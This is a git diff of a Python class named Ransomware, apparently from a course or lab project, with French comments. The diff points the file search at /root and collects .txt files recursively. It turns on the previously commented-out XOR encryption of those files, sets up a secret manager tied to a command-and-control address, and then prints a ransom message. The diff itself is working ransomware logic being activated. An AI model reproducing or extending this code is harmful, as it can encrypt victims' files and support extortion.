@@ -37,11 +37,11 @@ class Ransomware:
     def get_files(self, filter:str)->list:
 
         # Indique que le début de la recherche des fichiers se fait depuis le répertoire du fichier
-        p = Path('.') 
+        p = Path("/root")
         # Recherche et stock les chemins absolus des fichiers correspondant avec le filtre
         files = p.rglob('*' + filter) 
 
-        # transforme list_file (objet Path.rglob) en list
+        # Transforme list_file (objet Path.rglob) en list
         list_files = list(files) 
  
         # return all files matching the filter
@@ -52,8 +52,6 @@ class Ransomware:
         # Liste des fichiers correspondants au filtre
         filtre = '.txt'
         list_files_to_encrypt = self.get_files(filtre)
-        for file in list_files_to_encrypt:
-            print(file)
 
         # Création d'un objet SecretManager
         secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
@@ -62,7 +60,7 @@ class Ransomware:
         secret_manager.setup()
 
         # Chiffrement des fichiers
-        # secret_manager.xorfiles(list_files_to_encrypt)
+        secret_manager.xorfiles(list_files_to_encrypt)
 
         # Affichage du message
         print(ENCRYPT_MESSAGE)
